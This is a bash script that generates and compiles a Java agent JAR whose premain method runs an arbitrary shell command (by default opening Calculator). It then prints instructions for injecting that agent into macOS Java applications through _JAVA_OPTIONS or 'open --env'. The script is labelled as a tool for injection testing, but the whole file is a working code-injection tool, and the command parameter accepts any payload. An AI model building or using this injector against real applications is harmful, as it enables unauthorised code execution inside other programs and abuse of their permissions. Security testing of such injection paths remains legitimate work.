#!/bin/bash
# Java Agent Creator
# Creates a Java agent for injection testing

set -e

OUTPUT_DIR="${1:-/tmp}"
COMMAND="${2:-/usr/bin/open -a Calculator}"

echo "=== Java Agent Creator ==="
echo "Output directory: $OUTPUT_DIR"
echo "Command to execute: $COMMAND"
echo ""

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Create Agent.java
AGENT_FILE="$OUTPUT_DIR/Agent.java"
cat > "$AGENT_FILE" << EOF
import java.io.*;
import java.lang.instrument.*;

public class Agent {
  public static void premain(String args, Instrumentation inst) {
    try {
      String[] commands = new String[] { "bash", "-c", "$COMMAND" };
      Runtime.getRuntime().exec(commands);
    }
    catch (Exception err) {
      err.printStackTrace();
    }
  }
}
EOF

echo "Created: $AGENT_FILE"

# Create manifest.txt
MANIFEST_FILE="$OUTPUT_DIR/manifest.txt"
cat > "$MANIFEST_FILE" << EOF
Premain-Class: Agent
Agent-Class: Agent
Can-Redefine-Classes: true
Can-Retransform-Classes: true
EOF

echo "Created: $MANIFEST_FILE"

# Compile the agent
echo ""
echo "Compiling agent..."
if command -v javac &> /dev/null; then
    cd "$OUTPUT_DIR"
    javac Agent.java
    jar cvfm Agent.jar manifest.txt Agent.class
    echo ""
    echo "Created: $OUTPUT_DIR/Agent.jar"
    echo ""
    echo "Usage:"
    echo "  export _JAVA_OPTIONS='-javaagent:$OUTPUT_DIR/Agent.jar'"
    echo "  \"/path/to/JavaApplicationStub\""
    echo ""
    echo "Or:"
    echo "  open --env \"_JAVA_OPTIONS='-javaagent:$OUTPUT_DIR/Agent.jar'\" -a \"App Name\""
else
    echo "Warning: javac not found. Agent.java and manifest.txt created but not compiled."
    echo "To compile manually:"
    echo "  cd $OUTPUT_DIR"
    echo "  javac Agent.java"
    echo "  jar cvfm Agent.jar manifest.txt Agent.class"
fi

echo ""
echo "=== Complete ==="
